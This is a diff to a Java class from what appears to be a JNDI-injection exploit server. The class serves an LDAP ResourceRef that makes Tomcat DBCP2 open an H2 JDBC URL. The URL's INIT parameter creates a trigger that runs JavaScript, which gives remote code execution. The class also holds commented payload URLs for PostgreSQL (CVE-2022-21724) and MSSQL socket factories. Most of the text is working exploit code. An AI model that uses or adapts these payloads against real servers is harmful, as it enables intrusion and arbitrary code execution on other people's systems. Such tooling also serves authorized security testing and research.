@@ -13,28 +13,30 @@ import javax.naming.StringRefAddr;
 import static artsploit.Utilities.serialize;
 
 /**
- * Yields:
- * RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
- * When bean is created on the server side, we can control its class name and setter methods,
- * so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
- *
- * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
+ * RCE by controlling the JDBC URL (connection string) of Tomcat DBCP2 BasicDataSourceFactory class.
+ * BasicDataSourceFactory provides an implementation of javax.naming.ObjectFactory that can be used to instantiate a data source
+ * and the connection string is controllable via the url attribute.
+ * JDBC connection string for an H2 database provides an INIT parameter that can be used to execute an SQL statement.
+ * The CREATE TRIGGER statement of the H2 db, supports Javascript code inside the trigger body. So by creating a JDBC
+ * connection string to an H2 DB with the INIT parameter set to a CREATE TRIGGER statement containing JS code in the body
+ * an RCE can be triggered.
  *
  * Requires:
- *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
- *  - tomcat-embed-core.jar
- *  - tomcat-embed-el.jar
+ *  Tomcat DBCP2 and H2 in classpath
  *
- * @author artsploit
+ *  Verified on:
+ *  - org.apache.tomcat.embed:tomcat-embed-core:8.5.61
+ *  - com.h2database:h2:2.1.214
+ *
+ * @author snowyowl
  */
 
-@LdapMapping(uri = {"/o=dbcp2h2"})
+@LdapMapping(uri = {"/o=dbcp2-h2"})
 public class Dbcp2H2 implements LdapController {
 
-    @SuppressWarnings({"DuplicatedCode", "CommentedOutCode"})
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
 
-        System.out.println("Sending LDAP ResourceRef result for " + base + " with dbcp2-h2-sql payload");
+        System.out.println("Sending LDAP ResourceRef result for " + base + " with tomcat-dbcp2-h2-sql payload");
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
@@ -47,9 +49,6 @@ public class Dbcp2H2 implements LdapController {
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
                 "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
                 javascript + " $$";
-
-        // payload for PostgreSQL server; works only on versions affected by CVE-2022-21724.
-        // String url = "jdbc:postgresql://localhost:5432/testdb?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=" + Config.command;
 
         // payload for MSSql server  - yet to be developed into a working exploit.
         // String url = "jdbc:sqlserver://localhost:1533;connectRetryCount=0;encrypt=false;database=testdb;integratedSecurity=false;socketFactoryClass=com.snowyowl.commonsbeanutils1.jdbc.mssql.DummySocketFactory;socketFactoryConstructorArg=http://127.0.0.1:7800/bean.xml";
